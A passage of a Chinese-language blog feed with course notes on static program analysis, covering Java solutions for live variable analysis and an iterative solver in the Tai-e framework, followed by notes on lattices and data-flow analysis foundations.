href="#transfernode"></a> transferNode</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">transferNode</span><span class="hljs-params">(Stmt stmt, SetFact&lt;Var&gt; in, SetFact&lt;Var&gt; out)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">//这里设置中间值Tmp,以便之后进行对比查看IN是否发生变化</span><br>    SetFact&lt;Var&gt; NewInTmp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetFact</span>&lt;&gt;();<br>    <span class="hljs-comment">//对Tmp进行赋值</span><br>    NewInTmp.union(out);<br>    <span class="hljs-comment">//获取defB,之后获取数据,判断类型是否相同,然后删除</span><br>    <span class="hljs-keyword">if</span>(stmt.getDef().isPresent())&#123;<span class="hljs-comment">//判断值存在不为null</span><br>        <span class="hljs-type">LValue</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> stmt.getDef().get();<br>        <span class="hljs-keyword">if</span>(def <span class="hljs-keyword">instanceof</span> Var)&#123;<span class="hljs-comment">//这里是关注活跃变量，所以只分析Var类型的数据即可，它既可以是左值，也可以是右值</span><br>            NewInTmp.remove((Var)def);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//遍历useB,之后使用add进行添加(这里union类型为SetFact&lt;Var&gt;,所以不能使用)</span><br>    <span class="hljs-keyword">for</span>(RValue Use: stmt.getUses())&#123;<br>        <span class="hljs-keyword">if</span>(Use <span class="hljs-keyword">instanceof</span> Var)&#123;<br>            NewInTmp.add((Var) Use);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//比对transfer function之后的结果和一开始的结果有没有发生变化,不同就更新(set)</span><br>    <span class="hljs-keyword">if</span>(!NewInTmp.equals(in))&#123;<span class="hljs-comment">//equals相同返回true</span><br>        in.set(NewInTmp);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<span class="hljs-comment">//这里transferNode之后有改变返回true，DataflowAnalysis中定义的</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里就是创建一个拥有OUT的副本，然后对于副本进行删除def和加上use，最后和IN进行比较，不同就更新IN为副本。这样做是为了完成transferNode本身改变返回true的定义而设计的。</p><h2 id="迭代求解器"><a class="markdownIt-Anchor" href="#迭代求解器"></a> 迭代求解器</h2><h3 id="analysis-2"><a class="markdownIt-Anchor" href="#analysis-2"></a> analysis</h3><ul><li><code>pascal.taie.analysis.dataflow.fact.DataflowResult</code><ul><li>该类对象用于维护数据流分析的 CFG 中的 fact。可以通过它的 API 获取、设置 CFG 节点(BB)的 <code>IN facts</code> 和 <code>OUT facts</code>, 这也表示fact存储有关 BB 的信息</li></ul></li><li><code>pascal.taie.analysis.graph.cfg.CFG</code><ul><li>这个类用于表示程序中方法的控制流图(control-flow graphs)。</li><li>它是可迭代的，也就是说你可以通过一个 <em>for</em> 循环遍历其中的所有节点。这就意味着它维护了某些方法可以遍历所有的节点(CFG继承的接口Graph中方法 <code>Set&lt;N&gt; getNodes()</code> 可以遍历所有节点)</li></ul></li><li><code>pascal.taie.analysis.dataflow.solver.Solver</code><ul><li>这是数据流分析求解器的基类，包含了求解器的抽象功能。它定义了数据流分析的基本流程和步骤，沿着CFG来对数据进行分析处理，它的具体分析逻辑和迭代算法由它的子类实现提供。</li></ul></li><li><code>pascal.taie.analysis.dataflow.solver.IterativeSolver</code><ul><li>这个类扩展了 <code>Solver</code> 的功能并实现了迭代求解算法。</li></ul></li><li>这里要分清楚控制流和数据流的区别<ul><li>控制流图具体就是指由 BB 连接在一起的程序执行流程图，它是程序执行顺序的体现</li><li>而数据流图则是指具体的数据在控制流图中的流动而形成的数据更改图，可以认为它以控制流为骨架，它是在上面流动的血，它体现出整个程序在某个状态的可能性。它是一个庞大的数据集，但是这里进行了简化处理，它只展示出我们需要分析的数据</li></ul></li></ul><h3 id="具体代码-2"><a class="markdownIt-Anchor" href="#具体代码-2"></a> 具体代码</h3><h4 id="代码总览-2"><a class="markdownIt-Anchor" href="#代码总览-2"></a> 代码总览</h4><p>​主要就是完成位于 <code>Solver</code> 的 initializeBackward 方法，和位于 <code>IterativeSolver</code> 的 doSolveBackward 方法。</p><ol><li><code>Solver.initializeBackward(CFG,DataflowResult)</code></li><li><code>IterativeSolver.doSolveBackward(CFG,DataflowResult)</code></li></ol><p>initializeBackward是整个CFG图的数据流初始化，调用了上面活跃变量分析的初始化方法，而doSolveBackward也是一样的操作，调用上面的方法，同时组织成一种遍历算法来进行迭代操作，从而获得最终答案。</p><h4 id="initializebackward"><a class="markdownIt-Anchor" href="#initializebackward"></a> initializeBackward</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeBackward</span><span class="hljs-params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     这里的结果会从cfg中取出并存储在result,所以操作的最终实现需要result,这个操作相当于全部初始化</span><br><span class="hljs-comment">     首先设置 IN[exit] = 0</span><br><span class="hljs-comment">    */</span><br>    result.setInFact(cfg.getExit(), analysis.newBoundaryFact(cfg));<br>    <span class="hljs-comment">// 遍历所有的节点,设置所有的IN[B]=0, (OUT[B]=0?这是为了定义还是初始化?---&gt;</span><br>    <span class="hljs-comment">// 应该是为了初始化，这里是为了meet服务的，在上一个任务点中有讲述到，为了便于直接进行out U= IN，所以需要对out进行初始化</span><br>    <span class="hljs-keyword">for</span>(Node node: cfg.getNodes())&#123;<br>        <span class="hljs-keyword">if</span>(cfg.isExit(node)) <span class="hljs-keyword">continue</span>;<br>        result.setInFact(node, analysis.newInitialFact());<br>        result.setOutFact(node, analysis.newInitialFact());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里的初始化要和之前的<code>newBoundaryFact</code>和<code>newInitialFact</code>一起进行理解，其中<code>analysis</code>就是在这个Solver中定义的一个<code>protected final DataflowAnalysis&lt;Node, Fact&gt; analysis;</code>属性的值，它可以引用之前定义的这两个方法。我认为在Solver中完成这两个方法的功能也是可以的，但是这里分开就是为了解耦合(maybe)，或者说是将不同处的功能分离开，从而使代码更为健壮。</p><h4 id="dosolvebackward"><a class="markdownIt-Anchor" href="#dosolvebackward"></a> doSolveBackward</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSolveBackward</span><span class="hljs-params">(CFG&lt;Node&gt; cfg, DataflowResult&lt;Node, Fact&gt; result)</span> &#123;<br>    <span class="hljs-comment">/* TODO - finish me */</span><br>    <span class="hljs-comment">// 设置中止循环: 到达不动点</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span>(flag)&#123;<br>        flag = <span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">// 循环遍历所有的 Basic Block</span><br>        <span class="hljs-keyword">for</span>(Node BasicBlock: cfg.getNodes())&#123;<br>            <span class="hljs-comment">// 跳过EXIT BB</span><br>            <span class="hljs-keyword">if</span>(cfg.isExit(BasicBlock)) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-comment">// 获得当前 BB 的所有前驱 BB, 之后进行 Union</span><br>            <span class="hljs-keyword">for</span>(Node SuccBlock: cfg.getSuccsOf(BasicBlock))&#123;<br>                analysis.meetInto(result.getInFact(SuccBlock), result.getOutFact(BasicBlock));<br>            &#125;<br>            <span class="hljs-comment">// Transfer Function的实现, 同时完成是否达到不动点的判断</span><br> <span class="hljs-keyword">if</span>(analysis.transferNode(BasicBlock,result.getInFact(BasicBlock),result.getOutFact(BasicBlock)))&#123;<br>                flag = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这是在  首先设置<code>flag</code>来遍历所有轮，while里面遍历所有的 BB，然后施加数据流约束和转移方程约束，if中transferNode返回true表示上一次和这一次结果发生了变化，继续遍历下一轮，否则就结束了，达到了不动点。</p><h2 id="流程理解"><a class="markdownIt-Anchor" href="#流程理解"></a> 流程理解</h2><ul><li>对于整个流程，就是使用 <code>DataflowAnalysis</code> 与 <code>Solver</code> 进行交互。<ul><li><code>DataflowAnalysis</code> 对数据流进行处理, 使用子类 LiveVariableAnalysis 对基类的功能进行扩展, 实现了分析流中的初始化, Transfer Function 与 Control Flow 的实现。</li><li><code>Solver</code> 实现了迭代解释器, 它通过子类 lterativeSolver 对基类功能进行实现。之后通过 cfg 表示当前的控制流, 然后使用由 DataflowAnalysis 定义的 analysis 来对 cfg 进行操作。<ul><li>这里 <code>cfg</code> 是对于 Node 进行各项操作, 比如判断是否 Exit, 遍历寻找所有 BB。</li><li>而 <code>analysis</code> 则是包含了所有对于数据流的操作，比如 meetInto, transferNode。</li></ul></li></ul></li></ul><h2 id="疑问"><a class="markdownIt-Anchor" href="#疑问"></a> 疑问</h2><ol><li><p>在 <code>Assign.java</code> 中，soot(Tai-e)转化为三地址码时，对于语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> a + b;<br>c = a;<br><span class="hljs-comment">// 这里转化为三地址码，增加了临时变量temp$0</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">temp$0 = a;</span><br><span class="hljs-comment">    d = temp$0 + b;</span><br><span class="hljs-comment">    b = d;</span><br><span class="hljs-comment">    c = a;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ul><li>在询问chatgpt时，它给出的答案是这里引入 <code>temp$0</code> 并不是为了防止 <code>a</code> 被修改，而是为了确保在计算 <code>d </code> 的过程中，<code>a</code> 的原始值保持不变。这可能是为了在计算过程中确保 <code>a</code> 的值不会被无意间或意外地修改，以便获得正确的结果。</li><li>这里我感觉它说的有道理，为了防止潜在的对a进行更改的可能而引入临时变量进行存储(<s>感觉是囿于静态分析sound–&gt;may analysis的性质，可能更改我就提出阻止策略</s>, 但是又感觉不对，静态分析是在IR基础上进行的，这里是生成IR的过程)。所以感觉应该是它的固有属性</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>静态分析</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《软件分析》_part2</title>
    <link href="/posts/707fd24f.html"/>
    <url>/posts/707fd24f.html</url>
    
    <content type="html"><![CDATA[<p>This is my curriculum understanding.</p><blockquote><p>Reference:</p><p><a href="https://blog.csdn.net/zhang971105/category_10471447.html">静态分析学习笔记</a></p><p><a href="https://ranger-nju.gitbook.io/static-program-analysis-book/">上课笔记</a></p><p><a href="https://static-analysis.cuijiacai.com/05-inter/">详细博客</a></p></blockquote><h1 id="data-flow-analysis-foundations"><a class="markdownIt-Anchor" href="#data-flow-analysis-foundations"></a> Data Flow Analysis - Foundations</h1><h2 id="partial-order"><a class="markdownIt-Anchor" href="#partial-order"></a> Partial Order</h2><p>所谓偏序集合(poset)，就是一个由集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> 和偏序关系 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊑</mo></mrow><annotation encoding="application/x-tex">\sqsubseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊑</span></span></span></span> 所组成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mo>⊑</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P, \sqsubseteq)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">)</span></span></span></span> 对。这个对满足以下三个条件：</p><ul><li>Reflexivity 自反性: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi mathvariant="normal">x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi mathvariant="normal">x</mi><mo>⊑</mo><mi mathvariant="normal">x</mi></mrow><annotation encoding="application/x-tex">\forall\mathrm{x}\in P,\mathrm{x}\sqsubseteq\mathrm{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord"><span class="mord mathrm">x</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathrm">x</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord"><span class="mord mathrm">x</span></span></span></span></span></li><li>Antisymmetry 反对称性: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>x</mi><mo>⊑</mo><mi>y</mi><mo>∧</mo><mi>y</mi><mo>⊑</mo><mi>x</mi><mo>⟹</mo><mi>x</mi><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">\forall x,y\in P,x\sqsubseteq y\land y\sqsubseteq x\Longrightarrow x=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></li><li>Transitivity 传递性: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">,</mo><mi>z</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>x</mi><mo>⊑</mo><mi>y</mi><mo>∧</mo><mi>y</mi><mo>⊑</mo><mi>z</mi><mo>⟹</mo><mi mathvariant="normal">x</mi><mo>⊑</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">\forall x,y,z\in P,x\sqsubseteq y\land y\sqsubseteq z\Longrightarrow\mathrm{x}\sqsubseteq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord"><span class="mord mathrm">x</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></li><li>例子：小于等于关系就是一个偏序关系，但小于关系不是偏序关系，它是全序关系。</li></ul><p>偏序关系与全序关系的区别在于，全序关系可以让任意两个元素比较，而<code>偏序关系不保证所有元素都能进行比较</code></p><h2 id="upper-and-lower-bounds"><a class="markdownIt-Anchor" href="#upper-and-lower-bounds"></a> Upper and Lower Bounds</h2><ul><li><p>对于偏序集中的某子集 S 来说：</p><ul><li><p>若存在元素 u 使得 S 的任意元素 x 有 x <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊑</mo></mrow><annotation encoding="application/x-tex">\sqsubseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊑</span></span></span></span> u，那么我们说 u 是 S 的上界(Upper bound)。</p></li><li><p>同理，若存在元素 l 使得 S 的任意元素 x 有 l <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊑</mo></mrow><annotation encoding="application/x-tex">\sqsubseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊑</span></span></span></span> x，那么我们说 l 是 S 的下界(Lower bound)。</p></li></ul></li><li><p>然后我们衍生出最小上界和最大下界的概念：</p><ul><li><p>在 S 的所有上界中，我们记<strong>最小上界</strong>(Least upper bound, lub)为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊔</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">\sqcup S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">⊔</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>, 满足所有上界 u 对 lub 有: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊔</mo><mi>S</mi><mo>⊑</mo><mi>u</mi></mrow><annotation encoding="application/x-tex">\sqcup S \sqsubseteq u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord">⊔</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span></p></li><li><p>类似地我们也能定义出<strong>最大下界</strong>(Greatest lower bound, glb)为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊓</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">\sqcap S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">⊓</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>, 满足所有下届 l 对 glb 有: $l \sqsubseteq \sqcup S $</p></li></ul></li><li><p>当 S 的元素个数只有两个{a, b}时，我们还可以有另一种记法：</p><ul><li><p>最小上界：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>⊔</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a \sqcup b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊔</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>, a <code>join</code> b</p></li><li><p>最大下界：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>⊓</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a \sqcap b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.55556em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span>, a <code>meet</code> b</p></li></ul></li></ul><p>并不是每个偏序集都有 lub 和 glb，但是如果有，那么该 lub, glb 将是唯一的。(可假设存在多个，然后用自反性证明它们是同一个)</p><h2 id="lattice"><a class="markdownIt-Anchor" href="#lattice"></a> Lattice</h2><h3 id="lattice-2"><a class="markdownIt-Anchor" href="#lattice-2"></a> Lattice</h3><p>​给定一个偏序集，如果任意元素 a, b 都有 lub 和 glb，那么这么偏序集就叫做 <strong>格(lattice)</strong>。也就是说<code>一个lattice的任意两个元素组成的元素对都有lub和glb</code>。</p><ul><li>属于 lattice 的：小于等于关系，子集关系</li><li>不属于 lattice 的：子串关系</li></ul><h3 id="semilattice"><a class="markdownIt-Anchor" href="#semilattice"></a> Semilattice</h3><p>​给定偏序集，对于任意元素 a，b 只有 lub，则称此偏序集为一个 <code>join semilattice</code>，若是任意元素 a，b 只有 glb，则称此偏序集为一个 <code>meet semilattice</code></p><h3 id="complete-lattice"><a class="markdownIt-Anchor" href="#complete-lattice"></a> Complete Lattice</h3><p>​给定一个偏序集，<code>任意子集S</code> 都存在 lub 和 glb，那么我们说这个 lattice 为<strong>全格(complete lattice)</strong></p><ul><li>属于全格的：子集关系</li><li>不属于全格的：小于等于关系，因为全体正整数没有一个边界</li></ul><p>​每一个全格都存在着 <strong>最大元素</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊤</mi></mrow><annotation encoding="application/x-tex">\top</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">⊤</span></span></span></span> (top)和 <strong>最小元素</strong> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">⊥</mi></mrow><annotation encoding="application/x-tex">\bot</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">⊥</span></span></span></span> (bottom)，他们分别是整个集合的 lub 和 glb。</p><p>​如果一个 lattice 是有穷的，那么它一定是一个全格。然而，一个全格不一定是有穷的，例如[0, 1]之间的实数是无穷的，但是期间的小于等于关系可以使其成为全格。</p><h3 id="product-lattice"><a class="markdownIt-Anchor" href="#product-lattice"></a> Product Lattice</h3><p>​另外还有 <strong>Product Lattice</strong>，多个 lattice 的<strong>笛卡尔积</strong>也能形成一个新的 lattice。</p><ul><li>product lattice 也是一个 lattice</li><li>如果 product lattice L是全格的积，那么 L 也是全格。</li></ul><h2 id="data-flow-analysis-framework-via-lattice"><a class="markdownIt-Anchor" href="#data-flow-analysis-framework-via-lattice"></a> Data Flow Analysis Framework via Lattice</h2><p>一个数据流分析框架(D, L, F)由以下元素组成：</p><ul><li>D: 数据流的方向，前向还是后向</li><li>L: 包含了数据值 V 和 meet, join 符号的格</li><li>F: V -&gt; V 的转移方程族</li></ul><p>从而，数据流分析可以被视为在 lattice 的值上迭代地应用转移方程和 meet/join 操作符。</p><h2 id="monotonicity-and-fixed-point-theorem"><a class="markdownIt-Anchor" href="#monotonicity-and-fixed-point-theorem"></a> Monotonicity and Fixed Point Theorem</h2><ul><li><p>对于问题----迭代算法在什么条件下可以停机？我们在这里引入不动点定理：</p><ul><li><strong>Monotonicity 单调性</strong>: 如果 <span class="katex"><span class="katex-mathml"><math 